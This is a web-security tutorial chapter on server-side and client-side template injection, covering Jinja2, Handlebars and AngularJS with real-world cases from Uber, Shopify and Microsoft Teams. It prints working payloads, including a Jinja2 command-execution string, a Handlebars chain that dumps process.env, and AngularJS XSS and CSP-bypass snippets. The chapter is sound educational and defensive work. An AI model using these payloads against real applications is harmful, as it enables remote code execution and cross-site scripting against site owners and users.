---
sidebar_position: 16
---

# Template Injection in Frontend: CSTI

CSTI, short for Client Side Template Injection, refers to template injection in the frontend. Since there is a frontend version, there is also a corresponding backend version called SSTI, which stands for Server Side Template Injection.

Before introducing the frontend version, let's take a look at the backend version.

## Server Side Template Injection

When writing backend code that needs to output HTML, you can choose to directly output it like in pure PHP:

``` php
<?php
  echo '<h1>hello</h1>';
?>
```

However, when there are dynamic parts in the HTML, the code becomes more and more complex. Therefore, in real development, a thing called a template engine is usually used, which we briefly mentioned when talking about sanitization.

For example, on my blog's article page, there is a part of the template like this:

``` html
<article class="article content gallery" itemscope itemprop="blogPost">
    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
        <%= post.title %>
    </h1>
    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
        <span class="column is-narrow">
            <time datetime="<%= date_xml(post.date) %>" itemprop="datePublished"><%= format_date_full(post.date) %></time>
        </span>
        <% if (post.categories && post.categories.length){ %>
        <span class="column is-narrow article-category">
            <i class="far fa-folder"></i>
            <%- (post._categories || post.categories).map(category =>
                    `<a class="article-category-link" href="${url_for(category.path)}">${category.name}</a>`)
                    .join('<span>></span>') %>
        </span>
        <% } %>
    </div>
    
    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
        <%- post.content %>
    </div>
</article>
```

When rendering, I just need to pass in the `post` object and combine it with the template to render a complete article page.

Template injection does not mean "attackers can manipulate data like `post`," but rather "attackers can manipulate the template itself."

For example, let's say there is a marketing email service. Usually, companies import user data into it and set their own templates, like this:

``` html
Hi, {{name}}

Do you find our product fits for your needs?
If not, feel free to schedule a brief 10-minute online meeting with me at your convenience.

You can make a reservation <a href="{{link}}?q={{email}}">here</a>

Huli
```

When the template is directly used by the backend, using Python with Jinja2 as an example, it would look like this:

``` python
from jinja2 import Template

data = {
    "name": "Peter",
    "link": "https://example.com",
    "email": "test@example.com"
}

template_str = """
Hi, {{name}}

Do you find our product fits for your needs?
If not, feel free to schedule a brief 10-minute online meeting with me at your convenience.

You can make a reservation <a href="{{link}}?q={{email}}">here</a>

Huli
"""
template = Template(template_str)
rendered_template = template.render(
    name=data['name'],
    link=data['link'],
    email=data['email'])
print(rendered_template)
```

The final output is:

``` html
Hi, Peter

Do you find our product fits for your needs?
If not, feel free to schedule a brief 10-minute online meeting with me at your convenience.

You can make a reservation <a href="https://example.com?q=test@example.com">here</a>

Huli
```

It looks fine, but what if we modify the template? Like this:

``` python
from jinja2 import Template

data = {
    "name": "Peter",
    "link": "https://example.com",
    "email": "test@example.com"
}

template_str = """
Output: {{ 
    self.__init__.__globals__.__builtins__
    .__import__('os').popen('uname').read()
}}
"""
template = Template(template_str)
rendered_template = template.render(
    name=data['name'],
    link=data['link'],
    email=data['email'])
print(rendered_template)
```

The output will become: `Output: Darwin`, and Darwin is the result of executing the `uname` command.

In simple terms, you can think of the contents inside `{{}}` as the code that the template engine will execute for you.

Although we used to only write simple `{{name}}`, we can actually do more operations, such as `{{ name + email }}`. In the case above, it starts with `self` and uses Python magic to read `__import__`, allowing the importing of other modules and achieving command execution.

Vulnerabilities that allow attackers to control the template are called template injection. When it occurs on the backend, it is called SSTI, and when it occurs on the frontend, it is called CSTI.

The defense method is simple: do not treat user input as part of the template. If you must do so, make sure to check if the template engine provides a sandbox feature that allows you to execute untrusted code in a secure environment.

## Real-world Examples of SSTI

The first example is a vulnerability discovered by Orange in Uber in 2016. One day, Orange suddenly noticed a `2` in an email sent by Uber and remembered that they had entered `{{ 1+1 }}` in the name field. This is a common technique when looking for SSTI vulnerabilities, where a lot of payloads are entered in input fields to check if there are any SSTI issues based on the results.

Then, they used the technique mentioned above to find which variables can be used and concatenated. Since Uber also uses Jinja2, the final payload is similar to what we just wrote, and they successfully achieved RCE (Remote Code Execution) using SSTI.

For a more detailed process, you can refer to: [Uber Remote Code Execution via Flask Jinja2 Template Injection](http://blog.orange.tw/2016/04/bug-bounty-uber-ubercom-remote-code_7.html)

The second example is the Handlebars SSTI in Shopify reported by Mahmoud Gamal in 2019.

Shopify's merchant backend has a feature that allows merchants to customize the emails sent to users (similar to the example I mentioned earlier). They can use syntax like `{{order.number}}` to customize the content. The backend uses Node.js with Handlebars as the template engine.

Because Handlebars has some protections and is more complex, hackers spent a lot of time trying to figure out how to attack it. After all, having SSTI is one thing, but not every template engine can be exploited for RCE.

The final payload they came up with was very long:

``` js
{{#with this as |obj|}}
    {{#with (obj.constructor.keys "1") as |arr|}}
        {{#with obj.constructor.name as |str|}}
            {{#blockHelperMissing str.toString}}
              {{#with (arr.constructor (str.toString.bind "return JSON.stringify(process.env);"))}}
                  {{#with (obj.constructor.getOwnPropertyDescriptor this 0)}}
                      {{#with (obj.constructor.defineProperty obj.constructor.prototype "toString" this)}}
                          {{#with (obj.constructor.constructor "test")}}
                            {{this}}
                          {{/with}}
                      {{/with}}
                  {{/with}}
              {{/with}}
            {{/blockHelperMissing}}
        {{/with}}
  {{/with}}
{{/with}}
```

Details can be found in the original article by the author: [Handlebars template injection and RCE in a Shopify app](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)

## Client Side Template Injection

Understanding CSTI becomes easier after understanding SSTI, as the principles are similar, with the only difference being that this template is a frontend template.

Wait, there are templates in the frontend too? Of course!

For example, Angular is one. Here's an example from the Angular [official website](https://angular.io/quick-start):

``` js
// import required packages
import 'zone.js';
import { Component } from '@angular/core';
import { bootstrapApplication } from '@angular/platform-browser';

// describe component
@Component({
  selector: 'add-one-button', // component name used in markup
  standalone: true, // component is self-contained
  template: // the component's markup
  `
   <button (click)="count = count + 1">Add one</button> {{ count }}
  `,
})

// export component
export class AddOneButtonComponent {
  count = 0;
}

bootstrapApplication(AddOneButtonComponent);
```

You can clearly see a parameter called `template`. If you change `{{ count }}` to `{{ constructor.constructor('alert(1)')() }}`, you will see an alert window pop up.

Using `constructor.constructor('alert(1)')()` because the template cannot directly access `window`, so a new function is created through the Function constructor.

In the Angular documentation, it is mentioned in [Angular's cross-site scripting security model](https://angular.io/guide/security#angulars-cross-site-scripting-security-model):

> Unlike values to be used for rendering, Angular templates are considered trusted by default, and should be treated as executable code. Never create templates by concatenating user input and template syntax. Doing this would enable attackers to inject arbitrary code into your application.

Templates should be treated as executable code, and user control over templates should never be allowed.

By the way, do you know the difference between AngularJS and Angular?

When it was first released in 2010, it was called AngularJS, and the version numbers were 0.x.x or 1.x.x. But after version 2, it was renamed Angular, with similar usage but a completely rewritten design. We will mainly refer to the old version, AngularJS, because it has more issues due to its age and is a library that is suitable for assisting attacks.

When AngularJS was first released, executing arbitrary code was also possible using `{{ constructor.constructor('alert(1)')() }}`. However, starting from version 1.2.0, a sandbox mechanism was added to prevent access to `window` in every possible way. But when it comes to attack and defense, security researchers will not lose, and they have found ways to bypass the sandbox.

This cycle of being bypassed, strengthening the sandbox, and being bypassed again continued. Finally, AngularJS announced the complete removal of the sandbox after version 1.6. The reason is that the sandbox is not actually a security feature. If your template can be controlled, then that should be the problem to solve, not the sandbox. Details can be found in the original announcement article: [AngularJS expression sandbox bypass](https://sites.google.com/site/bughunteruniversity/nonvuln/angularjs-expression-sandbox-bypass). More bypass history can be found in [DOM based AngularJS sandbox escapes](https://portswigger.net/research/dom-based-angularjs-sandbox-escapes).

In the AngularJS 1.x versions, it was more convenient and easy to use, requiring only an element with `ng-app`:

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
</head>
<body>
  <div ng-app>
    {{ 'hello world'.toUpperCase() }}
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
</body>
</html>
```

Although ideally, the entire frontend should be controlled by AngularJS, with communication with the backend through APIs, and the backend should not be involved in rendering the view, at that time the concept of SPA was not popular yet, and many websites still had the backend responsible for rendering the view. Therefore, it was very likely to write the following code:

``` php
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
</head>
<body>
  <div ng-app>
    Hello, <?php echo htmlspecialchars($_GET['name']) ?>
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
</body>
</html>
```

Insert the data directly into the HTML when rendering on the backend.

Although the above code has encoded the input, there are no illegal characters in `{{ alert(1) }}`, so it can still lead to XSS.

The defense method is the same as SSTI. Never treat user input as part of the template content, or it can easily cause issues.

## Practical Case of CSTI

Let's take a hot case as an example. Masato Kinugawa, a cybersecurity researcher from Japan, demonstrated an RCE vulnerability in Microsoft's communication software Teams during Pwn2Own 2022. By sending a message to the target, one can execute code on their computer! This vulnerability earned a prize of $150,000 at Pwn2Own.

Teams' desktop software is built with Electron, so essentially, it is a web page. To achieve RCE, the first step is usually to find XSS, which allows executing JavaScript code on the web page.

Teams also handle user input. Both the frontend and backend have sanitizers to remove strange things and ensure that the final rendered content is safe. Although some HTML can be controlled, many attributes and content are filtered.

For example, even for class names, only certain class names are allowed. Masato discovered that the sanitizer has some room for manipulating class names. For example, there is a rule like `swift-*`, so both `swift-abc` and `swift-;[]()'%` are allowed as class names.

But what's the use of only manipulating class names?

Here's the key: Teams' web page is written in AngularJS, which has many magical features. One of them is the `ng-init` attribute used for initialization, like this:

``` html
<!DOCTYPE html>
<html lang="en">
<body>
  <div ng-app>
    <div ng-init="name='test'">
      {{ name }}
    </div>
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
</body>
</html>
```

This will display `test` on the page, indicating that the code inside `ng-init` is executed.

So if you change it to `ng-init="constructor.constructor('alert(1)')()"`, an alert will pop up.

Now, what does this have to do with the class name we mentioned earlier? It turns out that this `ng-init` can also be used inside a class name:

``` html
<div class="ng-init:constructor.constructor('alert(1)')()">
</div>
```

Therefore, by combining the class name checking rules mentioned earlier, we can construct a class name that contains the payload mentioned above and successfully execute XSS.

The original article also includes a section on how AngularJS parses class names and bypasses the AngularJS sandbox for this version. Transforming XSS into RCE requires some effort, but since these are not related to the CSTI discussed in this article, they are skipped. I highly recommend checking out the original presentation: [How I Hacked Microsoft Teams and got $150,000 in Pwn2Own](https://speakerdeck.com/masatokinugawa/how-i-hacked-microsoft-teams-and-got-150000-dollars-in-pwn2own)

(By the way, Masato is really amazing. Many of his technical articles have impressed me. His understanding of frontend, JavaScript, and AngularJS is top-notch.)

## AngularJS and CSP Bypass

AngularJS is most commonly used in practice for CSP bypass. If you can find AngularJS within the paths allowed by CSP, there is a high chance of bypassing it. For example:

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="Content-Security-Policy" content="script-src https://cdnjs.cloudflare.com">
</head>
<body>
  <div ng-app ng-csp>
    <input id=x autofocus ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js"></script>
</body>
</html>
```

CSP is strict and only allows `https://cdnjs.cloudflare.com`, but this allows us to introduce AngularJS, resulting in XSS.

Although it may seem simple, upon closer inspection, it is not easy. Think about it, CSP does not have `unsafe-eval`, so no strings can be executed as code. But then how are all those strings inside `ng-focus` executed? Isn't that executing strings as code?

This is where AngularJS shines. In the default mode, AngularJS uses `eval` or similar methods to parse the strings you pass in. However, if you add [ng-csp](https://docs.angularjs.org/api/ng/directive/ngCsp), it tells AngularJS to switch to a different mode. It will use its own implemented interpreter to parse the strings and execute the corresponding actions.

Therefore, you can think of it as AngularJS implementing its own `eval` to execute strings as code without using these default functions.

When discussing bypassing CSP earlier, I mentioned that by making the path configuration more strict, you can "reduce the risk" rather than "completely eliminate the risk." An example I gave was setting it to `https://www.google.com/recaptcha/` instead of `https://www.google.com`.

In fact, in the GoogleCTF 2023, there was a challenge to bypass the CSP of `https://www.google.com/recaptcha/`, and the solution used AngularJS. This is why I said that a strict path can reduce the risk but cannot completely avoid it:

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="Content-Security-Policy" content="script-src https://www.google.com/recaptcha/">
</head>
<body>
  <div
    ng-controller="CarouselController as c"
    ng-init="c.init()"
  >
  [[c.element.ownerDocument.defaultView.alert(1)]]
  <div carousel><div slides></div></div>

  <script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
</body>
</html>
```

If you are interested in AngularJS CSP bypass, you can refer to my previous article: [Automatically Finding Alternatives to prototype.js in AngularJS CSP Bypass](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/), which introduces another bypass method.

## Conclusion

The CSTI discussed this time is also a type of "non-direct execution of JavaScript" attack.

When you encode all the output and think it is secure, but forget that your frontend has AngularJS, attackers can achieve XSS through seemingly secure `{{}}` using CSTI.

Although there are fewer and fewer websites using AngularJS now, and fewer people treat user input as part of the template, the world is not lacking in vulnerabilities, but in discoveries. Many vulnerabilities have simply not been discovered yet.

If your service uses AngularJS, make sure there are no CSTI issues.
